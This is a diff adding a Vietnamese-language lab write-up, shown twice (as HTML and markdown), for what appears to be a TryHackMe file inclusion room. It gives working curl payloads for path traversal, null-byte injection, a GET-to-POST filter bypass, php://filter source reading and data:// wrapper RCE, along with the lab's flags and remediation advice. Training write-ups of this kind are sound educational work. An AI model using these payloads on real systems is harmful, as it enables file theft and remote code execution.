@@ -6,10 +6,10 @@ tags:
 ---
 
 
-<div class="excalidraw-container" id="ex-t8ggkh">
+<div class="excalidraw-container" id="ex-29iftq">
   <div class="excalidraw-toolbar">
     <div class="excalidraw-badge">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 19l7-7 3 3-7 7-3-3z"></path><path d="M18 13l-1.5-7.5L2 2l3.5 14.5L13 18l5-5z"></path><path d="M2 2l7.586 7.586"></path><circle cx="11" cy="11" r="2"></circle></svg>
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
       <span>Excalidraw Mindmap</span>
     </div>
     <div class="excalidraw-controls">
@@ -22,6 +22,206 @@ tags:
   <div class="excalidraw-viewport">
     <div class="excalidraw-canvas-wrapper">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1242 3852" class="excalidraw-svg" data-width="1242" data-height="3852">
+<g transform="translate(-23.16,255.64)">
+
+<rect x="120.12210083007812" y="169.68960202239282" width="742.4681895410207" height="3386.000278348701" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
+<foreignObject x="120.12210083007812" y="169.68960202239282" width="742.4681895410207" height="3386.000278348701" class="excalidraw-foreign-md">
+  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
+    <div class="notion-embed-header">
+      <div class="notion-embed-header-left">
+        <span class="notion-embed-icon">📝</span>
+        <span class="notion-embed-title">📝 BÁO CÁO KHAI THÁC &amp; RECON BÀI LAB FILE INCLUSION / PATH TRAVERSAL</span>
+      </div>
+      <a href="#doc-1dcd936a9289f092a0a33e936aa45213a9ce2d11" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
+    </div>
+    <div class="notion-embed-body">
+      <h1>📝 BÁO CÁO KHAI THÁC &amp; RECON BÀI LAB FILE INCLUSION / PATH TRAVERSAL</h1>
+<p><strong>Target:</strong> <code>http://10.49.153.49/</code><br><strong>Ngày thực hiện:</strong> 29/08/2026<br><strong>Mục tiêu:</strong> Recon hạ tầng, phân tích tư duy khai thác, lấy tất cả Flag và chiếm quyền điều khiển (RCE) bài lab.</p>
+<hr>
+<h2>🎯 1. BẢNG KẾT QUẢ SOLVE LAB (FINAL RESULTS)</h2>
+<table>
+<thead>
+<tr>
+<th align="center">STT</th>
+<th align="left">Yêu cầu / Challenge</th>
+<th align="left">Phương pháp Khai thác</th>
+<th align="left">Kết quả / Flag</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>1</strong></td>
+<td align="left"><strong>Flag 1</strong> (<code>/etc/flag1</code>)</td>
+<td align="left">Direct POST LFI via <code>file</code> parameter</td>
+<td align="left"><code>F1x3d-iNpu7-f0rrn</code></td>
+</tr>
+<tr>
+<td align="center"><strong>2</strong></td>
+<td align="left"><strong>Flag 2</strong> (<code>/etc/flag2</code>)</td>
+<td align="left">Cookie-based LFI + Null Byte Injection (<code>%00</code>)</td>
+<td align="left"><code>c00k13_i5_yuMmy1</code></td>
+</tr>
+<tr>
+<td align="center"><strong>3</strong></td>
+<td align="left"><strong>Flag 3</strong> (<code>/etc/flag3</code>)</td>
+<td align="left">HTTP Method Switching (GET $\rightarrow$ POST) + Null Byte (<code>%00</code>)</td>
+<td align="left"><code>P0st_1s_w0rk1in9</code></td>
+</tr>
+<tr>
+<td align="center"><strong>4</strong></td>
+<td align="left"><strong>RCE</strong> (<code>/playground.php</code>)</td>
+<td align="left">Remote File Inclusion via <code>data://</code> wrapper</td>
+<td align="left"><code>lfi-vm-thm-f8c5b1a78692</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2>💡 2. CHUỖI TƯ DUY VÀ PHƯƠNG PHÁP LUẬN (MINDSET &amp; LOGICAL FLOW)</h2>
+<pre><code class="language-mermaid">flowchart TD
+    A[&quot;Bắt đầu Recon Web Target (10.49.153.49)&quot;] --&gt; B[&quot;Banner Grabbing &amp; Error Inspection&quot;]
+    B --&gt; C[&quot;Phát hiện PHP 5.2 + Apache 2.2.22 đằng sau Nginx Proxy&quot;]
+    C --&gt; D[&quot;Thử nghiệm các Input Vector (GET, POST, Cookie)&quot;]
+    
+    D --&gt;|&quot;POST Parameter&quot;| E1[&quot;Challenge 1: LFI thành công via POST&quot;]
+    D --&gt;|&quot;Cookie Header&quot;| E2[&quot;Challenge 2: LFI via Cookie + Null Byte (%00)&quot;]
+    D --&gt;|&quot;GET Filter Bypass&quot;| E3[&quot;Challenge 3: Chuyển HTTP Method GET -&gt; POST + %00&quot;]
+    
+    E1 --&gt; F[&quot;Dùng php://filter đọc Base64 mã nguồn các bài&quot;]
+    E2 --&gt; F
+    E3 --&gt; F
+    
+    F --&gt; G[&quot;Phân tích Whitebox Source Code &amp; Tìm vị trí /etc/flag*&quot;]
+    G --&gt; H[&quot;Kiểm tra /playground.php - Thử nghiệm RFI &amp; PHP Wrappers&quot;]
+    H --&gt; I[&quot;Thực thi thành công RCE với data:// wrapper&quot;]
+</code></pre>
+<h3>🧠 Các điểm tư duy cốt lõi:</h3>
+<ol>
+<li><p><strong>Tư duy &quot;Input Vector Matrix&quot; (Không chỉ phụ thuộc giao diện Web):</strong></p>
+<ul>
+<li>Giao diện HTML chỉ là lớp hiển thị ở phía Client. Các thông số gửi tới Server có thể nằm ở <code>GET</code>, <code>POST Body</code>, hoặc <code>HTTP Header (Cookie)</code>.</li>
+<li>Tool như <code>curl</code> cho phép can thiệp trực tiếp vào giao thức HTTP mà không bị giới hạn bởi nút bấm hay <code>&lt;form&gt;</code> trên browser.</li>
+</ul>
+</li>
+<li><p><strong>Fingerprinting Runtime môi trường để chọn kỹ thuật bypass phù hợp:</strong></p>
+<ul>
+<li>Khi quan sát lỗi <code>Warning: include(...)</code> tiết lộ môi trường đang chạy <strong>PHP 5.2</strong>, tư duy lập tức hướng tới lỗ hổng <strong>Null Byte Injection (<code>%00</code>)</strong>.</li>
+<li>Trong PHP &lt; 5.3.4, ký tự <code>%00</code> ngắt chuỗi ở tầng C, giúp loại bỏ phần mở rộng <code>.php</code> bị ứng dụng nối tự động ở phía sau.</li>
+</ul>
+</li>
+<li><p><strong>Tư duy &quot;Logic Flaw &amp; Method Impersonation&quot; (Bypass bộ lọc):</strong></p>
+<ul>
+<li>Khi gặp bộ lọc regex loại bỏ toàn bộ kí tự đặc biệt ở phương thức <code>GET</code> (<code>/[^a-z]/</code>), đặt câu hỏi: <em>&quot;Liệu lập trình viên có lọc đồng nhất ở tất cả HTTP Method hay không?&quot;</em></li>
+<li>Chuyển request sang <code>POST</code> giúp bỏ qua hoàn toàn bước kiểm tra regex do logic code chỉ gắn regex vào điều kiện <code>if (REQUEST_METHOD == &quot;GET&quot;)</code>.</li>
+</ul>
+</li>
+<li><p><strong>Tư duy Chuyển đổi từ Blackbox sang Whitebox:</strong></p>
+<ul>
+<li>Ngay khi khai thác được LFI đầu tiên, sử dụng wrapper <code>php://filter/convert.base64-encode/resource=...</code> để đọc toàn bộ mã nguồn PHP của hệ thống.</li>
+<li>Việc đọc mã nguồn giúp xác định chính xác tên file flag, quy tắc chặn chuỗi (<code>strpos</code>) và đường dẫn tuyệt đối.</li>
+</ul>
+</li>
+<li><p><strong>Tư duy nâng cấp từ LFI $\rightarrow$ RCE (Remote Code Execution):</strong></p>
+<ul>
+<li>Tại trang <code>/playground.php</code>, ứng dụng cho phép nạp file tự do. Thử nghiệm PHP Stream Wrapper <code>data://text/plain,&lt;?php system(&#39;hostname&#39;);?&gt;</code> cho phép nhúng và thực thi mã PHP trực tiếp trong bộ nhớ mà không cần upload file lên đĩa cứng.</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2>🛠️ 3. CÁC BƯỚC HÀNH ĐỘNG CHI TIẾT (STEP-BY-STEP EXECUTION LOG)</h2>
+<h3>Bước 1: Reconnaissance &amp; Hạ tầng</h3>
+<ul>
+<li>Quét cổng bằng Nmap: <code>nmap -sV -sC -F 10.49.153.49</code><ul>
+<li>Khám phá Port 80 (Nginx 1.18.0) và Port 22 (SSH OpenSSH 8.2p1).</li>
+</ul>
+</li>
+<li>Gửi HTTP Request kiểm tra Response Header &amp; Trang lỗi 404:<ul>
+<li>Nginx đóng vai trò Reverse Proxy chuyển tiếp request tới backend <code>Apache/2.2.22</code> chạy <code>PHP 5.2</code>.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3>Bước 2: Khai thác Challenge #1 (POST Parameter LFI)</h3>
+<ul>
+<li><strong>Hiện trạng:</strong> Giao diện hiển thị cảnh báo <code>The input form is broken! You need to send POST request with file parameter!</code>.</li>
+<li><strong>Hành động:</strong> Gửi HTTP POST request chứa tham số <code>file</code>:</li>
+</ul>
+<pre><code class="language-bash">curl -s -X POST -d &quot;file=../../../../../etc/flag1&quot; http://10.49.153.49/challenges/chall1.php
+</code></pre>
+<ul>
+<li><strong>Kết quả:</strong> Đọc thành công <code>/etc/flag1</code> $\rightarrow$ <strong><code>F1x3d-iNpu7-f0rrn</code></strong>.</li>
+</ul>
+<hr>
+<h3>Bước 3: Khai thác Challenge #2 (Cookie-based LFI + Null Byte)</h3>
+<ul>
+<li><strong>Hiện trạng:</strong> Trang web trả về Header <code>Set-Cookie: THM=Guest</code>. Mã nguồn nối mặc định tiền tố <code>includes/</code> và đuôi <code>.php</code>.</li>
+<li><strong>Hành động:</strong> Truyền payload LFI kèm Null Byte (<code>%00</code>) qua Cookie <code>THM</code>:</li>
+</ul>
+<pre><code class="language-bash">curl -s -H &quot;Cookie: THM=../../../../../etc/flag2%00&quot; http://10.49.153.49/challenges/chall2.php
+</code></pre>
+<ul>
+<li><strong>Kết quả:</strong> Ngắt được đuôi <code>.php</code> và đọc thành công <code>/etc/flag2</code> $\rightarrow$ <strong><code>c00k13_i5_yuMmy1</code></strong>.</li>
+</ul>
+<hr>
+<h3>Bước 4: Khai thác Challenge #3 (HTTP Method Bypass + Null Byte)</h3>
+<ul>
+<li><strong>Hiện trạng:</strong> Phương thức <code>GET</code> sử dụng <code>preg_replace(&#39;/[^a-z]/&#39;,&#39;&#39;, $_GET[&#39;file&#39;])</code> xóa hết ký tự <code>.</code>, <code>/</code>, <code>%00</code>.</li>
+<li><strong>Phân tích:</strong> Mã nguồn backend chỉ áp dụng bộ lọc regex khi <code>REQUEST_METHOD == &quot;GET&quot;</code>. Khi gửi bằng <code>POST</code>, ứng dụng bỏ qua regex và chỉ nối đuôi <code>.php</code>.</li>
+<li><strong>Hành động:</strong> Chuyển sang HTTP POST request gửi tham số <code>file</code> chứa Null Byte:</li>
+</ul>
+<pre><code class="language-bash">curl -s -X POST -d &quot;file=../../../../../etc/flag3%00&quot; http://10.49.153.49/challenges/chall3.php
+</code></pre>
+<ul>
+<li><strong>Kết quả:</strong> Bypass thành công bộ lọc và đọc <code>/etc/flag3</code> $\rightarrow$ <strong><code>P0st_1s_w0rk1in9</code></strong>.</li>
+</ul>
+<hr>
+<h3>Bước 5: Đọc mã nguồn Whitebox qua PHP Wrapper</h3>
+<p>Sử dụng điểm LFI ở Challenge 1 để đọc và mã hóa mã nguồn các bài lab sang Base64:</p>
+<pre><code class="language-bash">curl -s -X POST -d &quot;file=php://filter/convert.base64-encode/resource=chall3.php&quot; http://10.49.153.49/challenges/chall1.php
+</code></pre>
+<p>Mã nguồn thu được xác nhận chính xác các giả định về logic phân nhánh <code>GET</code>/<code>POST</code> và bộ lọc <code>strpos</code>.</p>
+<hr>
+<h3>Bước 6: Khai thác RCE tại <code>/playground.php</code></h3>
+<ul>
+<li><strong>Hiện trạng:</strong> Bài lab yêu cầu đạt RCE trên <code>/playground.php</code> để lấy output của lệnh <code>hostname</code>.</li>
+<li><strong>Phân tích:</strong> Cấu hình PHP cho phép <code>allow_url_include = On</code>.</li>
+<li><strong>Hành động:</strong> Sử dụng PHP Wrapper <code>data://</code> để chèn trực tiếp câu lệnh PHP <code>system(&#39;hostname&#39;)</code>:</li>
+</ul>
+<pre><code class="language-bash">curl -s &quot;http://10.49.153.49/playground.php?file=data://text/plain,&lt;?php%20system(&#39;hostname&#39;);?&gt;&quot;
+</code></pre>
+<ul>
+<li><strong>Kết quả:</strong> Thực thi thành công lệnh hệ thống và trả về <code>hostname</code>:</li>
+</ul>
+<pre><code class="language-text">lfi-vm-thm-f8c5b1a78692
+</code></pre>
+<hr>
+<h2>🛡️ 4. KHUYẾN NGHỊ PHÒNG THỦ (REMEDIATION)</h2>
+<ol>
+<li><strong>Kiểm soát chặt chẽ Input (Strict Whitelisting):</strong><ul>
+<li>Không cho phép người dùng tự do truyền đường dẫn file. Sử dụng danh sách cố định (Hardcoded Whitelist) các trang được phép bao hàm:<pre><code class="language-php">$allowed_pages = array(&quot;home&quot; =&gt; &quot;home.php&quot;, &quot;about&quot; =&gt; &quot;about.php&quot;);
+if (array_key_exists($page, $allowed_pages)) {
+    include($allowed_pages[$page]);
+}
+</code></pre>
+</li>
+</ul>
+</li>
+<li><strong>Nâng cấp môi trường PHP:</strong><ul>
+<li>Nâng cấp lên các phiên bản PHP hiện đại ($\ge 8.x$) để vô hiệu hóa hoàn toàn lỗ hổng Null Byte Injection.</li>
+</ul>
+</li>
+<li><strong>Cấu hình an toàn <code>php.ini</code>:</strong><ul>
+<li>Tắt tính năng nạp file từ xa: <code>allow_url_fopen = Off</code> và <code>allow_url_include = Off</code>.</li>
+</ul>
+</li>
+<li><strong>Đồng nhất quy tắc Filter:</strong><ul>
+<li>Đảm bảo các bộ lọc bảo mật được áp dụng đồng nhất trên tất cả các phương thức HTTP (<code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>HEADERS</code>).</li>
+</ul>
+</li>
+</ol>
+
+    </div>
+  </div>
+</foreignObject>
+
+</g>
 <g transform="translate(-23.16,255.64)">
 <path d="M649.90 327.69 L649.42 328.41 L649.15 329.18 L649.15 329.18" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
 </g>
@@ -164,6 +364,162 @@ tags:
     </div>
   </div>
 </div>
+
+
+---
+
+## 📖 Nội dung chi tiết bài viết (Writeup)
+
+<div id="doc-1dcd936a9289f092a0a33e936aa45213a9ce2d11" class="notion-callout-card">
+
+# 📝 BÁO CÁO KHAI THÁC & RECON BÀI LAB FILE INCLUSION / PATH TRAVERSAL
+
+**Target:** `http://10.49.153.49/`  
+**Ngày thực hiện:** 29/08/2026  
+**Mục tiêu:** Recon hạ tầng, phân tích tư duy khai thác, lấy tất cả Flag và chiếm quyền điều khiển (RCE) bài lab.
+
+---
+
+## 🎯 1. BẢNG KẾT QUẢ SOLVE LAB (FINAL RESULTS)
+
+| STT | Yêu cầu / Challenge | Phương pháp Khai thác | Kết quả / Flag |
+| :---: | :--- | :--- | :--- |
+| **1** | **Flag 1** (`/etc/flag1`) | Direct POST LFI via `file` parameter | `F1x3d-iNpu7-f0rrn` |
+| **2** | **Flag 2** (`/etc/flag2`) | Cookie-based LFI + Null Byte Injection (`%00`) | `c00k13_i5_yuMmy1` |
+| **3** | **Flag 3** (`/etc/flag3`) | HTTP Method Switching (GET $\rightarrow$ POST) + Null Byte (`%00`) | `P0st_1s_w0rk1in9` |
+| **4** | **RCE** (`/playground.php`) | Remote File Inclusion via `data://` wrapper | `lfi-vm-thm-f8c5b1a78692` |
+
+---
+
+## 💡 2. CHUỖI TƯ DUY VÀ PHƯƠNG PHÁP LUẬN (MINDSET & LOGICAL FLOW)
+
+```mermaid
+flowchart TD
+    A["Bắt đầu Recon Web Target (10.49.153.49)"] --> B["Banner Grabbing & Error Inspection"]
+    B --> C["Phát hiện PHP 5.2 + Apache 2.2.22 đằng sau Nginx Proxy"]
+    C --> D["Thử nghiệm các Input Vector (GET, POST, Cookie)"]
+    
+    D -->|"POST Parameter"| E1["Challenge 1: LFI thành công via POST"]
+    D -->|"Cookie Header"| E2["Challenge 2: LFI via Cookie + Null Byte (%00)"]
+    D -->|"GET Filter Bypass"| E3["Challenge 3: Chuyển HTTP Method GET -> POST + %00"]
+    
+    E1 --> F["Dùng php://filter đọc Base64 mã nguồn các bài"]
+    E2 --> F
+    E3 --> F
+    
+    F --> G["Phân tích Whitebox Source Code & Tìm vị trí /etc/flag*"]
+    G --> H["Kiểm tra /playground.php - Thử nghiệm RFI & PHP Wrappers"]
+    H --> I["Thực thi thành công RCE với data:// wrapper"]
+```
+
+### 🧠 Các điểm tư duy cốt lõi:
+
+1. **Tư duy "Input Vector Matrix" (Không chỉ phụ thuộc giao diện Web):**
+   - Giao diện HTML chỉ là lớp hiển thị ở phía Client. Các thông số gửi tới Server có thể nằm ở `GET`, `POST Body`, hoặc `HTTP Header (Cookie)`.
+   - Tool như `curl` cho phép can thiệp trực tiếp vào giao thức HTTP mà không bị giới hạn bởi nút bấm hay `<form>` trên browser.
+
+2. **Fingerprinting Runtime môi trường để chọn kỹ thuật bypass phù hợp:**
+   - Khi quan sát lỗi `Warning: include(...)` tiết lộ môi trường đang chạy **PHP 5.2**, tư duy lập tức hướng tới lỗ hổng **Null Byte Injection (`%00`)**.
+   - Trong PHP < 5.3.4, ký tự `%00` ngắt chuỗi ở tầng C, giúp loại bỏ phần mở rộng `.php` bị ứng dụng nối tự động ở phía sau.
+
+3. **Tư duy "Logic Flaw & Method Impersonation" (Bypass bộ lọc):**
+   - Khi gặp bộ lọc regex loại bỏ toàn bộ kí tự đặc biệt ở phương thức `GET` (`/[^a-z]/`), đặt câu hỏi: *"Liệu lập trình viên có lọc đồng nhất ở tất cả HTTP Method hay không?"*
+   - Chuyển request sang `POST` giúp bỏ qua hoàn toàn bước kiểm tra regex do logic code chỉ gắn regex vào điều kiện `if (REQUEST_METHOD == "GET")`.
+
+4. **Tư duy Chuyển đổi từ Blackbox sang Whitebox:**
+   - Ngay khi khai thác được LFI đầu tiên, sử dụng wrapper `php://filter/convert.base64-encode/resource=...` để đọc toàn bộ mã nguồn PHP của hệ thống.
+   - Việc đọc mã nguồn giúp xác định chính xác tên file flag, quy tắc chặn chuỗi (`strpos`) và đường dẫn tuyệt đối.
+
+5. **Tư duy nâng cấp từ LFI $\rightarrow$ RCE (Remote Code Execution):**
+   - Tại trang `/playground.php`, ứng dụng cho phép nạp file tự do. Thử nghiệm PHP Stream Wrapper `data://text/plain,<?php system('hostname');?>` cho phép nhúng và thực thi mã PHP trực tiếp trong bộ nhớ mà không cần upload file lên đĩa cứng.
+
+---
+
+## 🛠️ 3. CÁC BƯỚC HÀNH ĐỘNG CHI TIẾT (STEP-BY-STEP EXECUTION LOG)
+
+### Bước 1: Reconnaissance & Hạ tầng
+- Quét cổng bằng Nmap: `nmap -sV -sC -F 10.49.153.49`
+  - Khám phá Port 80 (Nginx 1.18.0) và Port 22 (SSH OpenSSH 8.2p1).
+- Gửi HTTP Request kiểm tra Response Header & Trang lỗi 404:
+  - Nginx đóng vai trò Reverse Proxy chuyển tiếp request tới backend `Apache/2.2.22` chạy `PHP 5.2`.
+
+---
+
+### Bước 2: Khai thác Challenge #1 (POST Parameter LFI)
+- **Hiện trạng:** Giao diện hiển thị cảnh báo `The input form is broken! You need to send POST request with file parameter!`.
+- **Hành động:** Gửi HTTP POST request chứa tham số `file`:
+```bash
+curl -s -X POST -d "file=../../../../../etc/flag1" http://10.49.153.49/challenges/chall1.php
+```
+- **Kết quả:** Đọc thành công `/etc/flag1` $\rightarrow$ **`F1x3d-iNpu7-f0rrn`**.
+
+---
+
+### Bước 3: Khai thác Challenge #2 (Cookie-based LFI + Null Byte)
+- **Hiện trạng:** Trang web trả về Header `Set-Cookie: THM=Guest`. Mã nguồn nối mặc định tiền tố `includes/` và đuôi `.php`.
+- **Hành động:** Truyền payload LFI kèm Null Byte (`%00`) qua Cookie `THM`:
+```bash
+curl -s -H "Cookie: THM=../../../../../etc/flag2%00" http://10.49.153.49/challenges/chall2.php
+```
+- **Kết quả:** Ngắt được đuôi `.php` và đọc thành công `/etc/flag2` $\rightarrow$ **`c00k13_i5_yuMmy1`**.
+
+---
+
+### Bước 4: Khai thác Challenge #3 (HTTP Method Bypass + Null Byte)
+- **Hiện trạng:** Phương thức `GET` sử dụng `preg_replace('/[^a-z]/','', $_GET['file'])` xóa hết ký tự `.`, `/`, `%00`.
+- **Phân tích:** Mã nguồn backend chỉ áp dụng bộ lọc regex khi `REQUEST_METHOD == "GET"`. Khi gửi bằng `POST`, ứng dụng bỏ qua regex và chỉ nối đuôi `.php`.
+- **Hành động:** Chuyển sang HTTP POST request gửi tham số `file` chứa Null Byte:
+```bash
+curl -s -X POST -d "file=../../../../../etc/flag3%00" http://10.49.153.49/challenges/chall3.php
+```
+- **Kết quả:** Bypass thành công bộ lọc và đọc `/etc/flag3` $\rightarrow$ **`P0st_1s_w0rk1in9`**.
+
+---
+
+### Bước 5: Đọc mã nguồn Whitebox qua PHP Wrapper
+Sử dụng điểm LFI ở Challenge 1 để đọc và mã hóa mã nguồn các bài lab sang Base64:
+```bash
+curl -s -X POST -d "file=php://filter/convert.base64-encode/resource=chall3.php" http://10.49.153.49/challenges/chall1.php
+```
+Mã nguồn thu được xác nhận chính xác các giả định về logic phân nhánh `GET`/`POST` và bộ lọc `strpos`.
+
+---
+
+### Bước 6: Khai thác RCE tại `/playground.php`
+- **Hiện trạng:** Bài lab yêu cầu đạt RCE trên `/playground.php` để lấy output của lệnh `hostname`.
+- **Phân tích:** Cấu hình PHP cho phép `allow_url_include = On`.
+- **Hành động:** Sử dụng PHP Wrapper `data://` để chèn trực tiếp câu lệnh PHP `system('hostname')`:
+```bash
+curl -s "http://10.49.153.49/playground.php?file=data://text/plain,<?php%20system('hostname');?>"
+```
+- **Kết quả:** Thực thi thành công lệnh hệ thống và trả về `hostname`:
+```text
+lfi-vm-thm-f8c5b1a78692
+```
+
+---
+
+## 🛡️ 4. KHUYẾN NGHỊ PHÒNG THỦ (REMEDIATION)
+
+1. **Kiểm soát chặt chẽ Input (Strict Whitelisting):**
+   - Không cho phép người dùng tự do truyền đường dẫn file. Sử dụng danh sách cố định (Hardcoded Whitelist) các trang được phép bao hàm:
+     ```php
+     $allowed_pages = array("home" => "home.php", "about" => "about.php");
+     if (array_key_exists($page, $allowed_pages)) {
+         include($allowed_pages[$page]);
+     }
+     ```
+2. **Nâng cấp môi trường PHP:**
+   - Nâng cấp lên các phiên bản PHP hiện đại ($\ge 8.x$) để vô hiệu hóa hoàn toàn lỗ hổng Null Byte Injection.
+3. **Cấu hình an toàn `php.ini`:**
+   - Tắt tính năng nạp file từ xa: `allow_url_fopen = Off` và `allow_url_include = Off`.
+4. **Đồng nhất quy tắc Filter:**
+   - Đảm bảo các bộ lọc bảo mật được áp dụng đồng nhất trên tất cả các phương thức HTTP (`GET`, `POST`, `PUT`, `HEADERS`).
+
+</div>
+
+---
+
 
 
 ### 🔗 Các bài viết liên kết trong sơ đồ
